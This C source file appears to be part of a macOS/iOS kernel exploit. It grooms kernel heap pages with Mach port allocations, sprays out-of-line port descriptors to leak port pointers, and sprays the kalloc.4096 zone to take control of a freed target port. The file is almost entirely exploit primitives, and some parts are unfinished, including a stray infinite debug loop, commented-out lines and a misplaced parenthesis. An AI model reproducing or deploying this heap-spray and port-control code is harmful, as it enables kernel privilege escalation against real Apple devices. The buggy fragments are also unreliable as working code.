#include "mach-ports.h"

int prepare_ports(mach_port_t *receive_port, mach_port_t *target_port, 
        mach_port_t *own_task_port, mach_port_t **before_ports,
        mach_port_t **after_ports, mach_port_t **spray_ports) {
    int ret;

    
    *before_ports = calloc(N_BEFORE_PORTS, sizeof(mach_port_t));
    *after_ports = calloc(N_AFTER_PORTS, sizeof(mach_port_t));
    *spray_ports = calloc(N_SPRAY_PORTS, sizeof(mach_port_t));

    // allocate before ports to fill gaps and hopefully make target port allocated
    // on a page completely full of before and after ports
    for (int i = 0; i < N_BEFORE_PORTS; i++) {
	    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &(*before_ports)[i])) != KERN_SUCCESS) {
            printf("before_ports Allocation %d Failed: %x\n", i, ret);
            return 1;
	    }
    }

    // allocate target port, this is what we will control
    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, target_port) != KERN_SUCCESS)) {
        printf("target_port Allocation Failed: %x", ret);
        return 1;
    }
    mach_port_insert_right(mach_task_self(), *target_port, *target_port, MACH_MSG_TYPE_MAKE_SEND);

    // fill in the rest of the page so we can completely free it
    for (int i = 0; i < N_AFTER_PORTS; i++) {
	    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &(*after_ports)[i])) != KERN_SUCCESS) {
            printf("after_ports Allocation %d Failed: %x\n", i, ret);
            return 1;
	    }
    }

    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, receive_port)) != KERN_SUCCESS) {
        printf("receive_port Allocation Failed: %x\n", ret);
        mach_port_destroy(mach_task_self(), *target_port);
        return 1;
    }

    // these will be used to spray into k.4096
    for (int i = 0; i < N_SPRAY_PORTS; i++) {
        if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &(*spray_ports)[i])) != KERN_SUCCESS) {
            printf("spray_ports Allocation %d Failed: %x", i, ret);
            return 1;
        }
    }

    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, own_task_port)) != KERN_SUCCESS) {
        printf("own_task_port Allocation Failed: %x\n", ret);
        mach_port_destroy(mach_task_self(), *target_port);
        mach_port_destroy(mach_task_self(), *receive_port);
        return 1;
    }
    mach_port_insert_right(mach_task_self(), *own_task_port, *own_task_port, MACH_MSG_TYPE_MAKE_SEND);

    return 0;
}

void destroy_ports(mach_port_t receive_port, mach_port_t *before_ports, mach_port_t *after_ports) {
    for (int i = 0; i < N_BEFORE_PORTS; i++)
    	mach_port_destroy(mach_task_self(), before_ports[i]);
    printf("Destroyed before_ports\n");

    for (int i = 0; i < N_AFTER_PORTS; i++)
    	mach_port_destroy(mach_task_self(), after_ports[i]);
    printf("Destroyed after_ports\n");

    mach_port_destroy(mach_task_self(), receive_port);
    printf("Destroyed receive_port\n");
}

int ool_ports_descriptor_spray(mach_port_t receive_port, size_t n_ool_ports_descriptor_messages,
			       size_t count, mach_port_t *data);

int spray_port_pointer(mach_port_t receive_port, mach_port_t target_port, mach_port_t other_port) {
    int i, ret;
    mach_port_t *ports;

    ports = calloc(N_PORTS_LEAK, sizeof(mach_port_t));
    for (i = 0; i < N_PORTS_LEAK; i++) {
        if (i == 2)
            ports[i] = target_port;
        else if (i == 3)
            ports[i] = other_port;
        else if (i == 4)
            ports[i] = mach_host_self();
        else
            ports[i] = MACH_PORT_NULL;
    }

    if (ool_ports_descriptor_spray(receive_port, N_OOL_PORTS_DESCRIPTOR, N_PORTS_LEAK, ports)) {
        printf("Could Not Leak Port Pointers\n");
        return 1;
    } else {
        printf("Sprayed Heap To Leak Port Pointer\n");
        ret = 0;
    }

    free(ports);
    return ret;
}


int spray_null_port_pointer(mach_port_t receive_port) {
    int i, ret;
    mach_port_t *ports;

    ports = calloc(N_PORTS_LEAK, sizeof(mach_port_t));
    for (i = 0; i < N_PORTS_LEAK; i++) {
        ports[i] = MACH_PORT_NULL;
    }

    if (ool_ports_descriptor_spray(receive_port, N_OOL_PORTS_DESCRIPTOR, N_PORTS_LEAK, ports)) {
        printf("Could Not Leak Port Pointers\n");
        return 1;
    } else {
        printf("Sprayed Heap To Leak Port Pointer\n");
        ret = 0;
    }

    free(ports);
    return ret;
}

int ool_ports_descriptor_spray(mach_port_t receive_port, size_t n_ool_ports_descriptor_messages,
			       size_t count, mach_port_t *data) {
    size_t i, msg_size;
    mach_port_t *ports;
    ool_leak_msg_t ool_msg;
    mach_msg_return_t ret;

    msg_size = (sizeof(struct ool_leak_msg) +
		(n_ool_ports_descriptor_messages * sizeof(mach_msg_ool_ports_descriptor_t)));
    ool_msg = calloc(1, msg_size);

    ool_msg->header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    ool_msg->header.msgh_size =  msg_size;
    ool_msg->header.msgh_remote_port = receive_port;
    ool_msg->header.msgh_local_port = MACH_PORT_NULL;
    ool_msg->header.msgh_id = 0x10101010;

    ool_msg->body.msgh_descriptor_count = n_ool_ports_descriptor_messages;

    for (i = 0; i < n_ool_ports_descriptor_messages; i++) {
        ool_msg->ool_ports[i].address = data;
        ool_msg->ool_ports[i].count = count;
        ool_msg->ool_ports[i].deallocate = 0;
        ool_msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
        ool_msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        ool_msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
    }

    ret = mach_msg_send(&ool_msg->header);
    if (ret != MACH_MSG_SUCCESS) {
        printf("Sending Mach Message Failed: %x\n", ret);
        printf("Could Not Spray Heap Via Port Descriptors\n");
        return 1;
    } else
	    printf("Successfully Sent Mach Messages For Port Descriptor Spray\n");

    free(ool_msg);

    return 0;
}

struct ool_spray_msg {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t ool[];
};

typedef struct ool_spray_msg * ool_spray_msg_t;

int ool_descriptor_spray(mach_port_t *spray_port, uint8_t *data, size_t data_size) {
    size_t msg_size;
    ool_spray_msg_t ool_msg;
    mach_msg_return_t ret;

    msg_size = sizeof(struct ool_spray_msg) + sizeof(mach_msg_ool_descriptor_t);

    ool_msg = calloc(1, msg_size);

    ool_msg->header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    ool_msg->header.msgh_size = msg_size;
    ool_msg->header.msgh_remote_port = *spray_port;
    ool_msg->header.msgh_local_port = MACH_PORT_NULL;
    ool_msg->header.msgh_id = 0x20202020;

    ool_msg->body.msgh_descriptor_count = 1;

    ool_msg->ool->address = data;
    ool_msg->ool->size = KALLOC_4096;
    ool_msg->ool->deallocate = 0;
    ool_msg->ool->type = MACH_MSG_OOL_DESCRIPTOR;
    ool_msg->ool->copy = MACH_MSG_PHYSICAL_COPY;

    if ((ret = mach_msg_send(&ool_msg->header)) != MACH_MSG_SUCCESS) {
        printf("Sending Mach Message Failed: %x", ret);
        printf("Could Not Spray Heap Via Memory Descriptors");
        free(ool_msg);
        return 1;
    }
    free(ool_msg);
    return 0;
}

int spray_kalloc_4096(mach_port_t *spray_ports, mach_port_t target_port,
				    uint32_t port_offset, int *port_number) {
    int ret;
    uint8_t *data;
    uint64_t *ip_context;
    uint64_t offset;
    mach_port_context_t context;

    printf("about to calloc\n");
    data = calloc(KALLOC_4096, sizeof(uint8_t));
    printf("done calloc\n");
    // testing
    // int* d = (int*)data;
    // int num = 0x00010001;
    // for (int i = 0; i < 0x250; i++) {
    //     d[i] = num;
    //     num += 0x00010001;
    // }
    // end of testing
    // ip_context = (uint64_t *)(data + port_offset - SIZEOF_VM_MAP_HEADER + IP_CONTEXT_PORT_OFFSET);
    ret = 0;

    for (int i = 0; i < N_SPRAY_PORTS; i++) {
        // *ip_context = MAGIC_CONSTANT + i;
        if ((ret = ool_descriptor_spray(&spray_ports[i], data, KALLOC_4096)) != MACH_MSG_SUCCESS) {
            printf("Sending Mach Message %d Failed: %x", i, ret);
            ret = 1;
            break;
        }
    }
    printf("sprayed k4096\n");

    if (!ret) {
        printf("about to get context\n");
        mach_port_get_context(mach_task_self(), target_port, &context);
        printf("Context: %x\n", context);

        while (true) {

        }

        if (context - MAGIC_CONSTANT >= N_SPRAY_PORTS) {
            printf("Context To Big. Spray Not Successful.");
            ret = 1;
        } else {
            *port_number = context - MAGIC_CONSTANT;
            printf("Port Number: %d", *port_number);
        }
    }

    if (ret) {
	    printf("Could Not Spray Into target_port");
    } else {
	    printf("Spraying kalloc.4096 Successful");
    }

    free(data);
    return ret;
}

uint32_t get_port_offset(uint32_t port_pointer) {
    return port_pointer & 0xfff;
}

uint32_t get_port_page(uint32_t port_pointer) {
    return port_pointer & ~0xfff;
}